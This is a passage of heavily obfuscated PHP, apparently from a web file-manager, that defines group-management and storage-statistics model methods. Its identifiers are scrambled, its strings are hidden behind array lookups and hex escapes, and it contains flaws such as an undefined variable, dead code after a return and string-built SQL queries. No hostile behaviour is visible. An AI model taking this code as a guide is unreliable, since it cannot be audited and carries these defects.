$this->where($½­‡¾•)->delete(); $this->metaSet($øšàï¸[$³°½ºÈ[541]], null, null); write_log(ACTION . $³°½ºÈ[2020] . KodUser::id() . $³°½ºÈ[2021] . $øšàï¸[$³°½ºÈ[541]] . $³°½ºÈ[2022] . $øšàï¸[$³°½ºÈ[79]] . $³°½ºÈ[201] . $øšàï¸[$³°½ºÈ[87]], $³°½ºÈ[2023]); return; } if ($øšàï¸[$³°½ºÈ[2014]] != $ ”°ˆğÀ) { $this->where($½­‡¾•)->save(array($³°½ºÈ[2007] => $ ”°ˆğÀ)); } } public function storageInfo($š½·ß¨€ = false) { $ˆ³Î‚ò¹ =& $_SERVER[ìïæ“œî]; $òñ›¦Ğè = $this->count() + 0.0; $ÅÏöÛşó = 0; $óœ— = 1; $—¤‰§Ï› = 0; $ö¥§Åò€ = 5000; for ($ÖÃú²—› = 0; $ÖÃú²—› < $òñ›¦Ğè; $ÖÃú²—› = $ÖÃú²—› + $ö¥§Åò€) { $‡«›¸µá = $this->limit($ÖÃú²—›, $ÖÃú²—› + $ö¥§Åò€)->select(); foreach ($‡«›¸µá as $øË‡àø®) { $óœ— += $øË‡àø®[$ˆ³Î‚ò¹[79]] * $øË‡àø®[$ˆ³Î‚ò¹[2014]]; $ÅÏöÛşó += $øË‡àø®[$ˆ³Î‚ò¹[79]] * ($øË‡àø®[$ˆ³Î‚ò¹[2014]] - 1); $—¤‰§Ï› += $øË‡àø®[$ˆ³Î‚ò¹[2014]]; } } $®Ş‚Ò§µ = array($ˆ³Î‚ò¹[2024] => $óœ—, $ˆ³Î‚ò¹[2025] => $ÅÏöÛşó, $ˆ³Î‚ò¹[2026] => $ÅÏöÛşó / $óœ—, $ˆ³Î‚ò¹[83] => $òñ›¦Ğè, $ˆ³Î‚ò¹[2027] => $—¤‰§Ï›); return $®Ş‚Ò§µ; } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\157\x75\x70"; protected $tableMeta = array("\164\141\142\154\x65\x4e\141\x6d\145" => "\x67\x72\x6f\165\x70\137\155\145\164\141", "\155\145\x74\x61\x46\151\145\154\144" => "\x67\162\157\165\x70\x49\x44"); protected function cacheFunctionAlias($¢€üâŸã) { $ª²º†ÊŸ =& $_SERVER[ìïæ“œî]; return array($ª²º†ÊŸ[2028] => array($¢€üâŸã[0], $ª²º†ÊŸ[2029]), $ª²º†ÊŸ[2030] => array($¢€üâŸã[0], $ª²º†ÊŸ[2031])); } protected function getInfo($£Óà‚™©, $äŸõ„»­ = false) { $ˆìŞ‹´å = $this->getInfoSimple($£Óà‚™©); if (!$ˆìŞ‹´å) { return !1; } if ($äŸõ„»­) { return $this->_listDataApplyItem($ˆìŞ‹´å); } return $this->cacheFunctionGet($_SERVER[ìïæ“œî][2032], $£Óà‚™©); } protected function getInfoSimple($äÛÕòÄ», $¶Şƒ¯…× = false) { $ÇŒ¤ÏÇâ =& $_SERVER[ìïæ“œî]; if ($¶Şƒ¯…×) { $€öÌÖ†˜ = array($ÇŒ¤ÏÇâ[1946] => intval($äÛÕòÄ»)); $­ˆóœ˜Ï = $this->where($€öÌÖ†˜)->find(); return is_array($­ˆóœ˜Ï) ? $­ˆóœ˜Ï : array(); } return $this->cacheFunctionGet($ÇŒ¤ÏÇâ[2033], $äÛÕòÄ»); } protected function groupAdd($ŒËî£¶) { $é¶ö¨‡ =& $_SERVER[ìïæ“œî]; if (!$ŒËî£¶[$é¶ö¨‡[192]] && isset($ŒËî£¶[$é¶ö¨‡[1946]]) && $ŒËî£¶[$é¶ö¨‡[1946]] == 1) { if ($—¾ìÊØà = $this->getInfoSimple($ŒËî£¶[$é¶ö¨‡[1946]], !0)) { return $ŒËî£¶[$é¶ö¨‡[1946]]; } } else { $—¾ìÊØà = $this->getInfoSimple($ŒËî£¶[$é¶ö¨‡[192]]); if (!$—¾ìÊØà) { return !1; } } $ÃŸåà = $é¶ö¨‡[594]; if ($—¾ìÊØà[$é¶ö¨‡[584]]) { $ÃŸåà = $—¾ìÊØà[$é¶ö¨‡[584]] . $—¾ìÊØà[$é¶ö¨‡[1946]] . $é¶ö¨‡[50]; } $äŞ÷»‹Ñ = array($é¶ö¨‡[494] => $this->groupNameAuto($ŒËî£¶[$é¶ö¨‡[192]], $ŒËî£¶[$é¶ö¨‡[32]]), $é¶ö¨‡[477] => $ŒËî£¶[$é¶ö¨‡[192]], $é¶ö¨‡[652] => $ÃŸåà, $é¶ö¨‡[2034] => $ŒËî£¶[$é¶ö¨‡[1932]], $é¶ö¨‡[2035] => 0, $é¶ö¨‡[1950] => 0); if (isset($ŒËî£¶[$é¶ö¨‡[1970]])) { $äŞ÷»‹Ñ[$é¶ö¨‡[1970]] = $ŒËî£¶[$é¶ö¨‡[1970]]; } else { $Ğ¼àğäŸ = $this->max($é¶ö¨‡[1970]); if (!$Ğ¼àğäŸ) { $Ğ¼àğäŸ = 0; } $äŞ÷»‹Ñ[$é¶ö¨‡[1970]] = $Ğ¼àğäŸ + 1; } if (!empty($ŒËî£¶[$é¶ö¨‡[1946]])) { $äŞ÷»‹Ñ[$é¶ö¨‡[1946]] = $ŒËî£¶[$é¶ö¨‡[1946]]; } $‘¢¦ôÑÄ = $this->add($äŞ÷»‹Ñ); $this->setNamePinyin($‘¢¦ôÑÄ, $äŞ÷»‹Ñ[$é¶ö¨‡[32]]); if (isset($ŒËî£¶[$é¶ö¨‡[2036]])) { $this->metaSet($‘¢¦ôÑÄ, array($é¶ö¨‡[2036] => $ŒËî£¶[$é¶ö¨‡[2036]], $é¶ö¨‡[2037] => $ŒËî£¶[$é¶ö¨‡[2037]])); unset($ŒËî£¶[$é¶ö¨‡[2036]]); unset($ŒËî£¶[$é¶ö¨‡[2037]]); } Model($é¶ö¨‡[1394])->groupRootAdd($‘¢¦ôÑÄ); $this->_clearCache($ŒËî£¶[$é¶ö¨‡[192]]); return $‘¢¦ôÑÄ; } protected function groupEdit($şÛ·´¨ï, $‡Ñõ‰”ç) { $ƒ¢ÌŞ‘Õ =& $_SERVER[ìïæ“œî]; $ºğÜ¢Ìå = $this->getInfoSimple($şÛ·´¨ï); if (!$ºğÜ¢Ìå) { return !1; } if (!empty($‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[192]])) { $¥êë½ëƒ = $this->getInfoSimple($‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[192]]); if (!$¥êë½ëƒ) { return !1; } if ($ºğÜ¢Ìå[$ƒ¢ÌŞ‘Õ[1946]] == $¥êë½ëƒ[$ƒ¢ÌŞ‘Õ[1946]]) { return !1; } if ($‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[192]] != $ºğÜ¢Ìå[$ƒ¢ÌŞ‘Õ[192]]) { if ($¥êë½ëƒ[$ƒ¢ÌŞ‘Õ[584]] !== $ºğÜ¢Ìå[$ƒ¢ÌŞ‘Õ[584]] && strpos($¥êë½ëƒ[$ƒ¢ÌŞ‘Õ[584]], $ºğÜ¢Ìå[$ƒ¢ÌŞ‘Õ[584]] . $ºğÜ¢Ìå[$ƒ¢ÌŞ‘Õ[1946]] . $ƒ¢ÌŞ‘Õ[50]) === 0) { return !1; } $‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[652]] = $¥êë½ëƒ[$ƒ¢ÌŞ‘Õ[584]] . $‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[192]] . $ƒ¢ÌŞ‘Õ[50]; $this->_changeChildLevel($ºğÜ¢Ìå, $¥êë½ëƒ); $this->_clearCache($¥êë½ëƒ[$ƒ¢ÌŞ‘Õ[1946]]); $this->_clearCache($ºğÜ¢Ìå[$ƒ¢ÌŞ‘Õ[192]]); } } if (isset($‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[32]])) { $this->setNamePinyin($şÛ·´¨ï, $‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[32]]); } if (isset($‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[2036]])) { $this->metaSet($şÛ·´¨ï, array($ƒ¢ÌŞ‘Õ[2036] => $‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[2036]], $ƒ¢ÌŞ‘Õ[2037] => $‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[2037]])); unset($‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[2036]]); unset($‡Ñõ‰”ç[$ƒ¢ÌŞ‘Õ[2037]]); } $this->_clearChildrenCache($ºğÜ¢Ìå); return $this->where(array($ƒ¢ÌŞ‘Õ[2038] => $şÛ·´¨ï))->save($‡Ñõ‰”ç); } private function _clearChildrenCache($Ô­ğ„¼) { $Ÿ¥‰ªÈø =& $_SERVER[ìïæ“œî]; $¹šÒÇÚ¡ = array($Ÿ¥‰ªÈø[652] => array($Ÿ¥‰ªÈø[612], $Ô­ğ„¼[$Ÿ¥‰ªÈø[584]] . $Ô­ğ„¼[$Ÿ¥‰ªÈø[1946]] . $Ÿ¥‰ªÈø[613])); $ù¿ù–¹ = $this->field($Ÿ¥‰ªÈø[1946])->where($¹šÒÇÚ¡)->select(); foreach ($ù¿ù–¹ as $ğïíé·°) { $this->_clearCache($ğïíé·°[$Ÿ¥‰ªÈø[1946]]); } } private function _clearCache($•åÙÂÜÆ) { $Øç‘ğšƒ =& $_SERVER[ìïæ“œî]; $this->cacheFunctionClear($Øç‘ğšƒ[2032], $•åÙÂÜÆ); $this->cacheFunctionClear($Øç‘ğšƒ[2033], $•åÙÂÜÆ); } private function _changeChildLevel($î«çğ‚, $À¥”óŞù, $‰Õæ£Ûû = false) { $’¼™½¦Ä =& $_SERVER[ìïæ“œî]; $ñ©ÙÁ = $î«çğ‚[$’¼™½¦Ä[584]] . $î«çğ‚[$’¼™½¦Ä[1946]] . $’¼™½¦Ä[50]; $âÎôšÊ€ = $À¥”óŞù[$’¼™½¦Ä[584]] . $À¥”óŞù[$’¼™½¦Ä[1946]] . $’¼™½¦Ä[50] . $î«çğ‚[$’¼™½¦Ä[1946]] . $’¼™½¦Ä[50]; if ($‰Õæ£Ûû) { $âÎôšÊ€ = $À¥”óŞù[$’¼™½¦Ä[584]] . $À¥”óŞù[$’¼™½¦Ä[1946]] . $’¼™½¦Ä[50]; } $èº¢áìæ = array($’¼™½¦Ä[652] => array($’¼™½¦Ä[612], $î«çğ‚[$’¼™½¦Ä[584]] . $î«çğ‚[$’¼™½¦Ä[1946]] . $’¼™½¦Ä[613])); $Õ¢§ƒ«« = array($’¼™½¦Ä[652] => array($’¼™½¦Ä[661], "\162\145\160\x6c\141\x63\x65\x28\160\x61\162\x65\156\x74\114\x65\166\x65\154\x2c\47{$ñ©ÙÁ}\47\x2c\47{$âÎôšÊ€}\47\51")); $this->_clearChildrenCache($î«çğ‚); $this->where($èº¢áìæ)->data($Õ¢§ƒ««)->save(); } public function setNamePinyin($¯¤ô«÷À, $ˆæçÅßƒ = false) { $µŞÃßÜ =& $_SERVER[ìïæ“œî]; if (!$ˆæçÅßƒ) { $ÛÕÊÅçü = $this->getInfoSimple($¯¤ô«÷À); $ˆæçÅßƒ = $ÛÕÊÅçü[$µŞÃßÜ[32]]; } if (!Input::check($ˆæçÅßƒ, $µŞÃßÜ[655])) { $this->metaSet($¯¤ô«÷À, $µŞÃßÜ[538], null); $this->metaSet($¯¤ô«÷À, $µŞÃßÜ[537], null); return; } $à¼èõ’„ = array($µŞÃßÜ[538] => str_replace($µŞÃßÜ[53], $µŞÃßÜ[12], Pinyin::get($ˆæçÅßƒ)), $µŞÃßÜ[537] => Pinyin::get($ˆæçÅßƒ, $µŞÃßÜ[656])); $this->metaSet($¯¤ô«÷À, $à¼èõ’„); } protected function groupStatus($×…ì±Ÿù, $¼òÓœ¾ê) { $ Êúéªş =& $_SERVER[ìïæ“œî]; $³ÕÉ¹¥Ö = $this->getInfoSimple($×…ì±Ÿù); if (!$³ÕÉ¹¥Ö) { return !1; } $this->_clearCache($×…ì±Ÿù); return $this->metaSet($×…ì±Ÿù, $ Êúéªş[799], $¼òÓœ¾ê); if ($¼òÓœ¾ê == $ Êúéªş[91]) { $–çÉ×ªÊ = $this->parentLevelArray($³ÕÉ¹¥Ö[$ Êúéªş[584]]); } else { } $–çÉ×ªÊ[] = $³ÕÉ¹¥Ö[$ Êúéªş[1946]]; $ï¸ÖßÓ¡ = array(); foreach ($–çÉ×ªÊ as $×…ì±Ÿù) { $ï¸ÖßÓ¡[] = array($ Êúéªş[1946] => $×…ì±Ÿù, $ Êúéªş[97] => $ Êúéªş[799], $ Êúéªş[450] => $¼òÓœ¾ê); $this->_clearCache($×…ì±Ÿù); } return Model($ Êúéªş[2039])->addAll($ï¸ÖßÓ¡, array(), !0); } protected function groupRemove($ûóô®”è, $­¢«ÀàÖ = false) { $«Êı¨ô± =& $_SERVER[ìïæ“œî]; $¡ÙÇ·„ƒ = array($«Êı¨ô±[1946] => $ûóô®”è); $ ­®ƒŒ = $this->where($¡ÙÇ·„ƒ)->find(); if (!$ ­®ƒŒ || $ ­®ƒŒ[$«Êı¨ô±[192]] == 0) { return !1; } if (!$­¢«ÀàÖ) { $ÄˆÏ×Í = $this->getInfoSimple($ ­®ƒŒ[$«Êı¨ô±[192]]); $this->_changeChildLevel($ ­®ƒŒ, $ÄˆÏ×Í, !0); $this->where(array($«Êı¨ô±[192] => $ûóô®”è))->save(array($«Êı¨ô±[192] => $ ­®ƒŒ[$«Êı¨ô±[192]])); $this->_clearCache($ÄˆÏ×Í[$«Êı¨ô±[1946]]); } Model($«Êı¨ô±[2039])->where($¡ÙÇ·„ƒ)->delete(); Model($«Êı¨ô±[2040])->where($¡ÙÇ·„ƒ)->delete(); Model($«Êı¨ô±[873])->groupRootRemove($ûóô®”è); $this->_clearCache($ ­®ƒŒ[$«Êı¨ô±[192]]); return $this->where($¡ÙÇ·„ƒ)->delete(); } protected function groupSort($ƒÇçë°Ñ) { $¤àµôÒï =& $_SERVER[ìïæ“œî]; $î¼ÄÉĞÊ = array(); foreach ($ƒÇçë°Ñ as $ªºãÄÂ => $¸¸Éğ³ƒ) { $î¼ÄÉĞÊ[] = array($¤àµôÒï[1946], $¸¸Éğ³ƒ, $¤àµôÒï[1970], $ªºãÄÂ + 1); } $this->saveAll($î¼ÄÉĞÊ); } public function listData() { $úƒ–±İï = $this->_makeOrder()->selectPage(50); $this->_listDataApply($úƒ–±İï[$_SERVER[ìïæ“œî][445]]); return $úƒ–±İï; } private function _makeOrder($€ØÆÊÉü = '') { $†Ì¥Î¦á =& $_SERVER[ìïæ“œî]; $ó¼İë“ƒ = array($†Ì¥Î¦á[1946], $†Ì¥Î¦á[32], $†Ì¥Î¦á[1934], $†Ì¥Î¦á[231]); $ÇÛÆ› = array($†Ì¥Î¦á[523] => $†Ì¥Î¦á[524], $†Ì¥Î¦á[525] => $†Ì¥Î¦á[526]); $ –êüïÚ = Input::get($†Ì¥Î¦á[530], $†Ì¥Î¦á[7], $†Ì¥Î¦á[1950], $ó¼İë“ƒ); $äúÚÖÄ = Input::get($†Ì¥Î¦á[531], $†Ì¥Î¦á[7], $†Ì¥Î¦á[2041], array($†Ì¥Î¦á[2041], $†Ì¥Î¦á[525])); $äúÚÖÄ = $ÇÛÆ›[$äúÚÖÄ]; $€ØÆÊÉü = $€ØÆÊÉü . "{$ –êüïÚ}\x20{$äúÚÖÄ}\x2c\x20\147\162\x6f\x75\x70\111\104\40\x61\163\x63"; return $this->order($€ØÆÊÉü); } public function listChild($ŒßËËÁı) { $ØÈ€Ò»è =& $_SERVER[ìïæ“œî]; $±î°“é = $this->where(array($ØÈ€Ò»è[192] => $ŒßËËÁı))->_makeOrder()->selectPage(200); $this->_listDataApply($±î°“é[$ØÈ€Ò»è[445]]); return $±î°“é; } public function listChildIds($ıÖØ—ğı) { $‡æÓíñ =& $_SERVER[ìïæ“œî]; if (is_string($Ê·²ş„)) { $ıÖØ—ğı = explode($‡æÓíñ[50], $ıÖØ—ğı); } $ÅÇØÕÊ¢ = $this->where(array($‡æÓíñ[1946] => array($‡æÓíñ[7], $ıÖØ—ğı)))->field($‡æÓíñ[2042])->select(); if (!$ÅÇØÕÊ¢) { return !1; } $‡Ù÷“´× = array(); foreach ($ÅÇØÕÊ¢ as $³”ÖÉèŠ) { $‡Ù÷“´×[] = "\163\x65\x6c\145\143\164\40\147\x72\x6f\x75\x70\111\104\x20\x66\162\157\x6d\x20\140\x67\x72\x6f\x75\160\x60\x20\x77\150\145\x72\145\40\160\x61\162\145\156\x74\x4c\145\x76\145\x6c\x20\x6c\x69\x6b\145\x20\x27{$³”ÖÉèŠ[$‡æÓíñ[584]]}{$³”ÖÉèŠ[$‡æÓíñ[1946]]}\54\45\x27"; } $‡Ù÷“´× = implode($‡æÓíñ[2043], $‡Ù÷“´×); $ÅÇØÕÊ¢ = $this->query($‡Ù÷“´×); if (!$ÅÇØÕÊ¢) { return array(); } $ıÖØ—ğı = array_to_keyvalue($ÅÇØÕÊ¢, $‡æÓíñ[12], $‡æÓíñ[1946]); return array_unique($ıÖØ—ğı); } public function listByID($ßì‘êÒ) { $²€•Şúš =& $_SERVER[ìïæ“œî]; if (!$ßì‘êÒ) { return array(); } $–Ñ®Œô™ = array($²€•Şúš[1946] => array($²€•Şúš[7], $ßì‘êÒ)); $ôºÓìÈ‰ = $this->where($–Ñ®Œô™)->select(); $ôºÓìÈ‰ = array_sort_keep($ôºÓìÈ‰, $²€•Şúš[1946], $ßì‘êÒ); $this->_listDataApply($ôºÓìÈ‰); return $ôºÓìÈ‰; } public function listSearch($ˆ¿¥ä…) { $²Âõëò =& $_SERVER[ìïæ“œî]; $ï¶â«–· = trim($ˆ¿¥ä…[$²Âõëò[2044]]); $Ëˆ¶Íòâ = explode($²Âõëò[53], $ï¶â«–·); if (!$ï¶â«–· || count($Ëˆ¶Íòâ) == 1) { return $this->listSearchNow($ˆ¿¥ä…); } $ı§Ëùèı = array($²Âõëò[445] => array()); foreach ($Ëˆ¶Íòâ as $˜ù”ÃÀî) { if (!trim($˜ù”ÃÀî)) { continue; } $ˆ¿¥ä…[$²Âõëò[2044]] = $˜ù”ÃÀî; $¦ú½ØÀõ = $this->listSearchNow($ˆ¿¥ä…); $ı§Ëùèı[$²Âõëò[445]] = array_merge($ı§Ëùèı[$²Âõëò[445]], $¦ú½ØÀõ[$²Âõëò[445]]); } $ı§Ëùèı[$²Âõëò[445]] = array_unique_by_key($ı§Ëùèı[$²Âõëò[445]], $²Âõëò[1946]); $ı§Ëùèı[$²Âõëò[442]] = array($²Âõëò[443] => count($ı§Ëùèı[$²Âõëò[445]]), $²Âõëò[439] => 20, $²Âõëò[429] => 1, $²Âõëò[444] => 1); return $ı§Ëùèı; } public function listSearchNow($ô†–º¤×) { $«¶—½¡î =& $_SERVER[ìïæ“œî]; $ßÂşùÖ« = trim($ô†–º¤×[$«¶—½¡î[2044]]); $€Ç»–Ù = isset($ô†–º¤×[$«¶—½¡î[2045]]) ? $ô†–º¤×[$«¶—½¡î[2045]] : !1; if (!trim($ßÂşùÖ«)) { return !1; } $ßÂşùÖ« = str_replace($«¶—½¡î[2046], $«¶—½¡î[2047], $ßÂşùÖ«); $Ğñš…Î = array($«¶—½¡î[1946] => array($«¶—½¡î[459], "{$ßÂşùÖ«}\x25"), $«¶—½¡î[32] => array($«¶—½¡î[459], "\45{$ßÂşùÖ«}\45"), $«¶—½¡î[1055] => $«¶—½¡î[2048]); if ($€Ç»–Ù) { $æ‹½îïê = $this->getInfoSimple($€Ç»–Ù); $¼ÀÙ‹ØÆ = $æ‹½îïê[$«¶—½¡î[584]] . $€Ç»–Ù . $«¶—½¡î[613]; $Ğñš…Î = array($Ğñš…Î, array($«¶—½¡î[584] => array($«¶—½¡î[459], $¼ÀÙ‹ØÆ))); } $Ğñš…Î = $this->parseWhereLike($Ğñš…Î); $ÉìÑ¯ñ§ = $this->_makeOrder()->where($Ğñš…Î)->selectPage(20); $ÉìÑ¯ñ§ = $ÉìÑ¯ñ§ ? $ÉìÑ¯ñ§ : array($«¶—½¡î[445] => array(), $«¶—½¡î[442] => array()); if (!$ÉìÑ¯ñ§ || count($ÉìÑ¯ñ§[$«¶—½¡î[445]]) < 5 && Input::check($ßÂşùÖ«, $«¶—½¡î[394])) { $ª“÷ìª = $this->groupChildrenAll($€Ç»–Ù); $¿¿Û„Æß = $this->_searchFromMeta($«¶—½¡î[537], $ßÂşùÖ«, 10, $ª“÷ìª); $À£¤¨ºä = $this->_searchFromMeta($«¶—½¡î[538], $ßÂşùÖ«, 10, $ª“÷ìª); $¥êâ²İÅ = array_merge($¿¿Û„Æß, $À£¤¨ºä, $ÉìÑ¯ñ§[$«¶—½¡î[445]]); $ÉìÑ¯ñ§[$«¶—½¡î[445]] = array_unique_by_key($¥êâ²İÅ, $«¶—½¡î[1946]); $ÉìÑ¯ñ§[$«¶—½¡î[442]][$«¶—½¡î[443]] = count($ÉìÑ¯ñ§[$«¶—½¡î[445]]); $ÉìÑ¯ñ§[$«¶—½¡î[442]][$«¶—½¡î[444]] = ceil($ÉìÑ¯ñ§[$«¶—½¡î[442]][$«¶—½¡î[443]] / $ÉìÑ¯ñ§[$«¶—½¡î[442]][$«¶—½¡î[439]]); } $this->_listDataApply($ÉìÑ¯ñ§[$«¶—½¡î[445]]); return $ÉìÑ¯ñ§; } protected function groupChildrenAll($Ğ¾ùĞá) { $¶Ó³·Œ› =& $_SERVER[ìïæ“œî]; if (!$Ğ¾ùĞá) { return !1; } if (!is_array($Ğ¾ùĞá)) { $Ğ¾ùĞá = array($Ğ¾ùĞá); } $Ó©õÜğ¯ = $Ğ¾ùĞá; foreach ($Ğ¾ùĞá as $ŸÕŸ¹öä) { $½ü’Ğ‹Ù = $this->getInfoSimple($ŸÕŸ¹öä); $»Óó™Êä = array($¶Ó³·Œ›[584] => array($¶Ó³·Œ›[459], $½ü’Ğ‹Ù[$¶Ó³·Œ›[584]] . $ŸÕŸ¹öä . $¶Ó³·Œ›[613])); $’¦§÷¶í = $this->field($¶Ó³·Œ›[1946])->where($»Óó™Êä)->select(); $Ó©õÜğ¯ = array_merge($Ó©õÜğ¯, array_to_keyvalue($’¦§÷¶í, $¶Ó³·Œ›[12], $¶Ó³·Œ›[1946])); } return array_unique($Ó©õÜğ¯); } private function _searchFromMeta($šŞğ´–ı, $ Ø¤´ÊÙ, $ÀÅÂ½ñ¾, $àŞ‰À¯á) { $‹ä¯µêã =& $_SERVER[ìïæ“œî]; $ Ø¤´ÊÙ = strtolower($ Ø¤´ÊÙ); $‰œ½õäù = array($‹ä¯µêã[97] => $šŞğ´–ı, $‹ä¯µêã[450] => array($‹ä¯µêã[459], "\45{$ Ø¤´ÊÙ}\x25")); $‰œ½õäù = $this->parseWhereLike($‰œ½õäù); if ($àŞ‰À¯á) { $‰œ½õäù[$‹ä¯µêã[1946]] = array($‹ä¯µêã[7], $àŞ‰À¯á); } $É‰¿€Àà = Model($‹ä¯µêã[2049])->where($‰œ½õäù)->limit($ÀÅÂ½ñ¾)->select(); if (!$É‰¿€Àà) { return array(); } $É‰¿€Àà = array_to_keyvalue($É‰¿€Àà, $‹ä¯µêã[12], $‹ä¯µêã[1946]); $°®Áí§— = $this->where(array($‹ä¯µêã[2038] => array($‹ä¯µêã[7], $É‰¿€Àà)))->select(); if (!$°®Áí§—) { return array(); } return $°®Áí§—; } protected function _listDataApplyItem($ï¢Àüäè) { $ü áò è = array($ï¢Àüäè); $this->_listDataApply($ü áò è); return $ü áò è[0]; } protected function _listDataApply(&$ïß¶æ Ú) { $²š•˜íÙ =& $_SERVER[ìïæ“œî]; if (!$ïß¶æ Ú) { return; } $Â¯ÑŠë = array_to_keyvalue($ïß¶æ Ú, $²š•˜íÙ[12], $²š•˜íÙ[1946]); $this->_listAppendChildren($ïß¶æ Ú); $this->_listAppendChildrenMember($ïß¶æ Ú); $this->_listAppendMeta($ïß¶æ Ú, $Â¯ÑŠë); $this->_listAppendParent($ïß¶æ Ú); $this->_listAppendSourceRoot($ïß¶æ Ú, $Â¯ÑŠë); } private function _listAppendChildren(&$®Ï¨›“) { $“›»­š¤ =& $_SERVER[ìïæ“œî]; $ä‰ñÇ¬Ø = array_to_keyvalue($®Ï¨›“, $“›»­š¤[12], $“›»­š¤[1946]); $ª”ëÈûá = array($“›»­š¤[192] => array($“›»­š¤[7], $ä‰ñÇ¬Ø)); $í½ÌÑËê = array($“›»­š¤[192], $“›»­š¤[2050] => $“›»­š¤[565]); $º¬ñÒÔ¾ = $this->field($í½ÌÑËê)->where($ª”ëÈûá)->group($“›»­š¤[192])->select(); $¥á¨›œŒ = array_to_keyvalue($º¬ñÒÔ¾, $“›»­š¤[192], $“›»­š¤[565]); foreach ($®Ï¨›“ as &$îĞÕÑ¡³) { $é”Ì¡²¢ = $îĞÕÑ¡³[$“›»­š¤[1946]]; $îĞÕÑ¡³[$“›»­š¤[2051]] = isset($¥á¨›œŒ[$é”Ì¡²¢]) ? intval($¥á¨›œŒ[$é”Ì¡²¢]) : !1; } unset($îĞÕÑ¡³); } private function _listAppendChildrenMember(&$™¬Ú¬ƒÕ) { $”ëƒ–™× =& $_SERVER[ìïæ“œî]; $¡«ÍÜø = array_to_keyvalue($™¬Ú¬ƒÕ, $”ëƒ–™×[12], $”ëƒ–™×[1946]); $âİŞ¾‘Ç = array($”ëƒ–™×[1946] => array($”ëƒ–™×[7], $¡«ÍÜø)); $·Ïš‹Ù¶ = array($”ëƒ–™×[1946], $”ëƒ–™×[2050] => $”ëƒ–™×[565]); $ÛËå”‚á = Model($”ëƒ–™×[2040])->field($·Ïš‹Ù¶)->where($âİŞ¾‘Ç)->group($”ëƒ–™×[1946])->select(); $¦ÁÀŒªã = array_to_keyvalue($ÛËå”‚á, $”ëƒ–™×[1946], $”ëƒ–™×[565]); foreach ($™¬Ú¬ƒÕ as &$­í•ªÂ) { $½¯¥èØã = $­í•ªÂ[$”ëƒ–™×[1946]]; $­í•ªÂ[$”ëƒ–™×[2052]] = isset($¦ÁÀŒªã[$½¯¥èØã]) ? intval($¦ÁÀŒªã[$½¯¥èØã]) : !1; } unset($­í•ªÂ); } private function _listAppendMeta(&$¸å®©½ì, $õä¿Ñ¡˜) { $ÒĞ·ßÊÍ =& $_SERVER[ìïæ“œî]; $ù»û–µî = array($ÒĞ·ßÊÍ[1946] => array($ÒĞ·ßÊÍ[7], $õä¿Ñ¡˜)); $Ê¾È¶Ôğ = Model($ÒĞ·ßÊÍ[2039])->where($ù»û–µî)->select(); $Ê¾È¶Ôğ = array_to_keyvalue_group($Ê¾È¶Ôğ, $ÒĞ·ßÊÍ[1946]); foreach ($Ê¾È¶Ôğ as &$ÀùÒ·³) { $ÀùÒ·³ = array_to_keyvalue($ÀùÒ·³, $ÒĞ·ßÊÍ[97], $ÒĞ·ßÊÍ[450]); } unset($ÀùÒ·³); foreach ($¸å®©½ì as &$œÈ½àû³) { $œÈ½àû³[$ÒĞ·ßÊÍ[539]] = array(); if (isset($Ê¾È¶Ôğ[$œÈ½àû³[$ÒĞ·ßÊÍ[1946]]])) { $œÈ½àû³[$ÒĞ·ßÊÍ[539]] = $Ê¾È¶Ôğ[$œÈ½àû³[$ÒĞ·ßÊÍ[1946]]]; } } unset($œÈ½àû³); } protected function parentLevelArray($ØÏ” Š—) { $ùÍ£“å =& $_SERVER[ìïæ“œî]; $ØÏ” Š— = explode($ùÍ£“å[50], trim($ØÏ” Š—, $ùÍ£“å[50])); $ØÏ” Š— = array_remove_value($ØÏ” Š—, $ùÍ£“å[228]); return $ØÏ” Š—; } protected function parentInGroup($‹œ™ŒÁÑ, $­ğ¼úÚ») { $°¢Ìò·í =& $_SERVER[ìïæ“œî]; $ë£ßœ· = $this->getInfoSimple($‹œ™ŒÁÑ); if (!$ë£ßœ·) { return !0; } $„ùÏŸ×È = $this->parentLevelArray($ë£ßœ·[$°¢Ìò·í[584]]); $„ùÏŸ×È[] = $‹œ™ŒÁÑ; foreach ($„ùÏŸ×È as $‹œ™ŒÁÑ) { if (in_array($‹œ™ŒÁÑ . $°¢Ìò·í[12], $­ğ¼úÚ»)) { return !0; } } return !1; } private function _listAppendParent(&$ïË¹éµ) { $Ûï“Öş =& $_SERVER[ìïæ“œî]; $¡ß–“ïˆ = array(); foreach ($ïË¹éµ as &$”Óãà ‘) { $¡ß–“ïˆ[$”Óãà ‘[$Ûï“Öş[1946]]] = $”Óãà ‘[$Ûï“Öş[32]]; $ğ”ìöÛË = $this->parentLevelArray($”Óãà ‘[$Ûï“Öş[584]]); foreach ($ğ”ìöÛË as $’±ÓƒíÔ) { if (!isset($¡ß–“ïˆ[$’±ÓƒíÔ])) { $¡ß–“ïˆ[$’±ÓƒíÔ] = 0; } } } unset($”Óãà ‘); foreach ($¡ß–“ïˆ as $ÇŒŒë¹ => $ùãïê÷²) { if ($ùãïê÷²) { continue; } $ÃƒÌÇô‚ = $this->getInfoSimple($ÇŒŒë¹); $¡ß–“ïˆ[$ÇŒŒë¹] = $ÃƒÌÇô‚[$Ûï“Öş[32]]; } $Ë…Âñ±‘ = $GLOBALS[$Ûï“Öş[6]][$Ûï“Öş[92]][$Ûï“Öş[2053]]; if (KodUser::isRoot()) { $Ë…Âñ±‘ = !1; } foreach ($ïË¹éµ as &$”Óãà ‘) { $ğ”ìöÛË = $this->parentLevelArray($”Óãà ‘[$Ûï“Öş[584]]); $´şááùÓ = $Ûï“Öş[12]; foreach ($ğ”ìöÛË as $ÇŒŒë¹ => $’±ÓƒíÔ) { if ($Ë…Âñ±‘ && $ÇŒŒë¹ == 0) { continue; } $´şááùÓ .= $¡ß–“ïˆ[$’±ÓƒíÔ] . $Ûï“Öş[8]; } if ($ğ”ìöÛË) { $´şááùÓ .= $”Óãà ‘[$Ûï“Öş[32]]; } $”Óãà 